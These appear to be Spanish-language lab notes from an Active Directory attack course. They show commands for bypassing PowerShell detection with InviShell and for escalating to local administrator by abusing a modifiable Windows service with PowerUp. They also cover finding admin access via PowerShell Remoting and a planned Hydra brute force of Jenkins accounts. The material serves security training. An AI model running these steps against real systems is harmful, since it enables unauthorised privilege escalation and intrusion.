
## Tareas
- [ ] Explotar un servicio en *dccorp-student97* y elevar los privilegios a administrador local
- [ ] Identificar una maquina en el dominio donde student97 tenga acceso administrativo local
- [ ] Utilizando los privilegios de un usuario en Jenkins *172.16.3.11:8080* obtener privilegios de administrador en *172.16.3.11*, el servidor *dcorp-ci*

**Flag 5 Servicio utilizado indebidamente en la maquina que permite la escalada de privilegios locales**

**Flag 6 Script utilizado para la búsqueda de privilegios mediante PowerShell Remoting**

**Flag 7 Usuario de Jenkins utilizado para acceder a la consola web de esta**

**Flag 8 Usuario de dominio utilizado para ejecutar Jenkins en dcorp-ci**

# Enumeración de servicios y abuso para escalar
## Enumeración
Primero deberemos de ejecutar *InviShell* para poder eludir las detecciones de PowerShell y poder ejecutar este de forma mas sigilosa
```shell
. .\InviShell\RunWithRegistryNonAdmin.bat  
```

Y después podremos ejecutar *PowerUp*
```shell
. .\PowerUp.ps1 
```

### Enumerar servicios vulnerables
Este tipo de enumeración nos va a permitir encontrar servicios vulnerables que tengan activos los parámetros `CanRestart: True`, `Modifiable Services` y `Unquoted Service Paths`, con funciones de abuso relacionadas para explotarlas
```shell
Invoke-AllChecks
```

Vemos varios servicios vulnerables pero en este caso elegimos uno que tenga `CanRestart: True`
```shell
ServiceName   : SNMPTRAP
Path          : C:\Windows\System32\snmptrap.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'SNMPTRAP'
CanRestart    : True
Name          : SNMPTRAP
Check         : Modifiable Services
```

Para abusar de ello deberemos de usar el siguiente comando en el que añadiremos nuestra cuenta al grupo de Administradores Locales

## Escalada
Primero deberemos de revisar los ejemplos de funciones de abuso
```shell
help Invoke-ServiceAbuse -Example
```

En este caso la que necesitaremos es la siguiente forma de abuso
```shell
Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName "dcorp\student97" -Verbose
```

Usaremos esta función por que es la que nos permite añadir un usuario de dominio a la cuanta de Administradores locales

Después deberemos de verificar que se nos ha introducido en ese grupo
```shell
Get-LocalGroupMember -Group "Administrators"
```

Identificando a nuestro usuario en este grupo

# Identificar una maquina donde tengamos acceso administrativo local
## Enumeración
Enumeraremos las maquinas  en las que nuestra cuenta de usuario tiene acceso como administrador local
Usaremos la herramienta *Find-PSRemotingLocalAdminAccess*
```shell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

Y la ejecutaremos
```shell
Find-PSRemotingLocalAdminAccess -Verbose
```

Encontrando a dos maquinas que tenemos acceso de administrador local


# Usando los privilegios de un usuario en Jenkins172.16.3.11:8080 obtener privilegios de administrador en esta IP y servidor *dcorp-ci*
Accederemos al panel de control de *Jenkins* a través del navegador
Vemos que es la versión *Jenkins 2.361.4*
En el panel de *People* podemos enumerar tres cuentas de usuario
Ahora podremos hacer ataques de fuerza bruta hacia las cuentas usando *Hydra*